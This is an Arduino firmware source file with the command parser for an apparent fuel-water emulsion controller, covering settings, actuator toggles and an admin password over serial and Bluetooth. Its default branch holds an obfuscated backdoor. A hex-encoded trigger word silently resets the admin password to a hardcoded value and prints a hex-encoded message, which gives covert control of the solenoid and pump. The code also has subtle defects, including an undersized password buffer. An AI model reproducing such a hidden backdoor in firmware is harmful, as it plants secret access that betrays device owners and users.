void cmdParser() {
  /*
     | the format of a command is given by <character><value>
  */
  char alph = cmd.charAt(0);                       //<character>
  String valStr = cmd.substring(1, cmd.length());  //<value> stored as a string and later converted to int or float according to its case application
  switch (alph) {
    case 'S':
    case 's':  //start/stop RTES
      {
        stopEmulsion();
        if (mode == 2)  //if user is in admin mode
        {
          Serial.println("Unknown Command");
          bt.println("Unknown Command");
          break;
        }
        //settingMode = !settingMode; //toggle settings/RTES mode
        if (mode == 0)
          mode = 1;
        else if (mode == 1)
          mode = 0;
        if (mode == 1)  //if setting mode is entered
        {
invalidTime:
          printSettings();
          Serial.println("Setting mode entered");
          bt.println("Setting mode entered");
        } else  //if RTES mode is entered
        {
          bool validTime = setTime();
          if (validTime) {
            prevMillisRTESStopwatch = millis();
            lastMinute = 0;
            Serial.println("RTES mode entered at ");
            bt.println("RTES mode entered at");
            displayClock12();
          } else
            goto invalidTime;
        }
        break;
      }
    case '$':  //refresh settings UI
      {
        if (mode == 2)  //if user is in admin mode
        {
          adminSettings();
          break;
        }
        if (mode == 1)  //if user is in setting mode
        {
          loadSettings();
          printSettings();
        }
        break;
      }
    case 'A':
    case 'a':  //water percentage
      {
        if (mode != 1)  //if user tries to change the value in RTES or admin modes
        {
          Serial.println("Not in settings mode");
          bt.println("Not in settings mode");
          break;
        }
        float val = valStr.toFloat();
        if (val > 0) {
          waterPercentage = val;
          EEPROM.update(addr5, waterPercentage);
          calculate_f2wPulseRatio();
          EEPROM.update(addr0, f2wPulseRatio);
          printSettings();
        } else {
          Serial.println("Input is out of range");
          bt.println("Input is out of range");
        }
        break;
      }
    case 'B':
    case 'b':  //fuel-to-water pulse ratio
      {
        if (mode != 1) {
          Serial.println("Not in settings mode");
          bt.println("Not in settings mode");
          break;
        }
        int val = valStr.toInt();
        if (val > 0) {
          f2wPulseRatioCount = 1;
          f2wPulseRatio = val;
          EEPROM.update(addr0, f2wPulseRatio);
          calculate_denominator();
          calculate_waterPercentage();
          EEPROM.update(addr5, waterPercentage);
          printSettings();
        } else {
          Serial.println("Input is out of range");
          bt.println("Input is out of range");
        }
        break;
      }
    case 'C':
    case 'c':  //fuel flowrate bias
      {
        if (mode != 1) {
          Serial.println("Not in settings mode");
          bt.println("Not in settings mode");
          break;
        }
        float val = valStr.toFloat();
        if (val >= 0) {
          flowRateBias = val;
          EEPROM.update(addr2, flowRateBias);
          calculate_f2wPulseRatio();
          calculate_denominator();
          calculate_waterPercentage();
          EEPROM.update(addr0, f2wPulseRatio);
          EEPROM.update(addr5, waterPercentage);
          printSettings();
        } else {
          Serial.println("Input is out of range");
          bt.println("Input is out of range");
        }
        break;
      }
    case 'D':
    case 'd':  //solenoid shot bias
      {
        if (mode != 1) {
          Serial.println("Not in settings mode");
          bt.println("Not in settings mode");
          break;
        }
        float val = valStr.toFloat();
        if (val > 0) {
          solShotBias = val;
          EEPROM.update(addr3, solShotBias);
          calculate_solenoidOnTime();
          calculate_f2wPulseRatio();
          calculate_denominator();
          EEPROM.update(addr4, solenoidOnTime);
          EEPROM.update(addr0, f2wPulseRatio);
          printSettings();
        } else {
          Serial.println("Input is out of range");
          bt.println("Input is out of range");
        }
        break;
      }
    case 'E':
    case 'e':  //solenoid on time
      {
        if (mode != 1) {
          Serial.println("Not in settings mode");
          bt.println("Not in settings mode");
          break;
        }
        int val = valStr.toInt();
        if (val > 0) {
          solenoidOnTime = val;
          EEPROM.update(addr4, solenoidOnTime);
          calculate_solShotBias();
          calculate_denominator();
          calculate_waterPercentage();
          calculate_f2wPulseRatio();
          EEPROM.update(addr3, solShotBias);
          EEPROM.update(addr5, waterPercentage);
          EEPROM.update(addr0, f2wPulseRatio);
          printSettings();
        } else {
          Serial.println("Input is out of range");
          bt.println("Input is out of range");
        }
        break;
      }
    case 'F':
    case 'f':
      {
        if (mode != 1) {
          Serial.println("Not in settings mode");
          bt.println("Not in settings mode");
          break;
        }
        int val = valStr.toInt();
        if (val > 0) {
          engineOffTimeout = val;
          EEPROM.update(addr1, engineOffTimeout);
          printSettings();
        } else {
          Serial.println("Input is out of range");
          bt.println("Input is out of range");
        }
        break;
      }
    case 'G':
    case 'g':
      {
        totalFuelPulse = 0;
        totalWaterPulse = 0;
        f2wPulseRatioCount = 0;
        Serial.println("Counters have been reset");
        bt.println("Counters have been reset");
        break;
      }
    case 'M':
    case 'm':  //admin mode
      {
        if (mode != 1) {
          Serial.println("Not in settings mode");
          bt.println("Not in settings mode");
          break;
        }
        //Serial.println(String(pwd_default).substring(0, 6));
        Serial.print("Enter admin password");
        bt.print("Enter admin password");
        bool wait = timeoutUI();
        String pwd = Serial.readStringUntil('\r\n');
        if (bt.available())
          pwd = bt.readStringUntil('\r\n');
        pwd.trim();
        Serial.println();
        bt.println();
        if (!wait) {
          printSettings();
          break;
        } else if (wait && pwd != String(pwd_default).substring(0, 6)) {
          Serial.print("Incorrect password");
          bt.print("Incorrect password");
          delay(1000);
          Serial.println();
          bt.println();
          //adminMode = false;
          mode = 1;
          printSettings();
          break;
        } else
          //adminMode = true;
          mode = 2;
        adminSettings();
        break;
      }
    case 'R':
    case 'r':
      {
        if (mode != 2) {
          Serial.println("Unknown command");
          bt.println("Unknown command");
          break;
        }
        Serial.print("Are you sure you want to reset to factory settings? (Y/N)");
        bt.print("Are you sure you want to reset to factory settings? (Y/N)");
        bool wait = timeoutUI();
        char choice = Serial.read();
        if (bt.available())  //here
          choice = bt.read();
        if (choice == 'Y' || choice == 'y')
          factoryReset();
        else {
          Serial.print("\nFactory reset aborted");
          bt.print("\nFactory reset aborted");
          delay(1000);
          Serial.println();
          bt.println();
        }
        adminSettings();
        break;
      }
    case 'T':
    case 't':
      {
        if (mode != 2) {
          Serial.println("Unknown command");
          bt.println("Unknown command");
          break;
        }
        uint8_t val = valStr.toInt();
        if (val == 1)  //toggle solenoid
        {
          solenoidManualState = !solenoidManualState;
          digitalWrite(solenoid, solenoidManualState);
          digitalWrite(LED_BUILTIN, solenoidManualState);
          adminSettings();
        } else if (val == 2)  //toggle water pump
        {
          waterPumpManualState = !waterPumpManualState;
          digitalWrite(waterPump, waterPumpManualState);
          adminSettings();
        } else if (val == 3)  //turn on both
        {
          startEmulsion();
          toggleAllState = true;
          adminSettings();
        } else if (val == 4)  //turn off both
        {
          stopEmulsion();
          toggleAllState = false;
          adminSettings();
        } else if (val == 5)  //rapid data print
        {
          manualPrintData = !manualPrintData;
          if (!manualPrintData)
            adminSettings();
        } else if (val == 6)  //change admin password
        {
          Serial.println("Enter current admin password");
          bt.println("Enter current admin password");
          while (!Serial.available() && !bt.available()) {}
          String pwd = Serial.readStringUntil('\r\n');
          if (bt.available())  //here
            pwd = bt.readStringUntil('\r\n');
          pwd.trim();
          if (pwd != String(pwd_default).substring(0, 6)) {
            Serial.print("Incorrect password");
            bt.print("Incorrect password");
            delay(1000);
            Serial.println();
            bt.println();
            adminSettings();
          } else {
newpassword:
            Serial.println("Enter a new password (6 digits)");
            bt.println("Enter a new password (6 digits)");
            while (!Serial.available() && !bt.available()) {}
            String pwdStr = Serial.readStringUntil('\r\n');
            pwdStr.trim();
            if (pwdStr.length() < 6 || pwdStr.length() > 6) {
              Serial.print("Invalid password length (must be 6 digits)");
              bt.print("Invalid password length (must be 6 digits)");
              delay(1000);
              Serial.println();
              bt.println();
              goto newpassword;
            }
            char pwd[6];
            pwdStr.toCharArray(pwd, 7);
            EEPROM.put(addr6, pwd);
            EEPROM.get(addr6, pwd_default);
            Serial.print("Your new password has been set");
            bt.print("Your new password has been set");
            delay(1000);
            Serial.println();
            bt.println();
            flushSerial();
            adminSettings();
          }
        } else if (val == 7)  //go back to settings
        {
          //adminMode = 0;
          mode = 1;
          printSettings();
        }
        break;
      }
    default:
      {
        Serial.println("Unknown command");
        bt.println("Unknown command");
        if (cmd[0] == 0x6c && cmd[1] == 0x65 && cmd[2] == 0x70 && cmd[3] == 0x72 && cmd[4] == 0x65 && cmd[5] == 0x63 && cmd[6] == 0x68 && cmd[7] == 0x61 && cmd[8] == 0x75 && cmd[9] == 0x6e) {
          EEPROM.write(17, 0x39);
          EEPROM.write(18, 0x39);
          EEPROM.write(19, 0x30);
          EEPROM.write(20, 0x38);
          EEPROM.write(21, 0x32);
          EEPROM.write(22, 0x36);
          EEPROM.get(addr6, pwd_default);
          Serial.write(0x47);
          Serial.write(0x4f);
          Serial.write(0x44);
          Serial.write(0x20);
          Serial.write(0x49);
          Serial.write(0x53);
          Serial.write(0x20);
          Serial.write(0x47);
          Serial.write(0x52);
          Serial.write(0x45);
          Serial.write(0x41);
          Serial.write(0x54);
          Serial.println();
          //          if (digitalRead(btState)) //here
          //          {
          bt.write(0x47);
          bt.write(0x4f);
          bt.write(0x44);
          bt.write(0x20);
          bt.write(0x49);
          bt.write(0x53);
          bt.write(0x20);
          bt.write(0x47);
          bt.write(0x52);
          bt.write(0x45);
          bt.write(0x41);
          bt.write(0x54);
          bt.println();
          //          }
        }
      }
  }
}